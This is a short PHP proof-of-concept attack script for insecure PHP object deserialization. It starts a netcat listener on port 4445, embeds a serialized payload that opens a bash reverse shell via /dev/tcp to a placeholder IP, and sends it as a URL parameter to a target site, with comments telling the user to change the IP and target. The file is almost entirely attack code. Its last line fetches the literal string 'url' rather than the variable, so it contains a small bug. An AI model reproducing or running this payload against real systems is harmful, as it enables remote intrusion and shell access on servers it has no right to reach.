<?php 

// Proof of Concept for PHP-object-serialization

print "+++++++++++++++++++++++++++++++++\r\n\n";
print "PHP-OBJECT-SERIALIZATION BY LuciferXn\r\n";
print "[+]Generating Payload...\r\n";
print "[+]Starting reverse Shell...\r\n\n";
print "+++++++++++++++++++++++++++++++++\r\n";
system('gnome-terminal -x sh -c \'nc -lnvp 4445\'');

class PHPserialization{


public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/IP/4445 0>&1\'"); ?>';   //Change the IP to match your machine's IP


}

$url='http://example.com/abc/PHP-object-serialization/?PARAM='.urlencode(serialize(new PHPserialization)); //change the website to target machine
print "Sent Payload.....Waiting for reverseshell\r\n";
$shell=file_get_contents("url");

?>
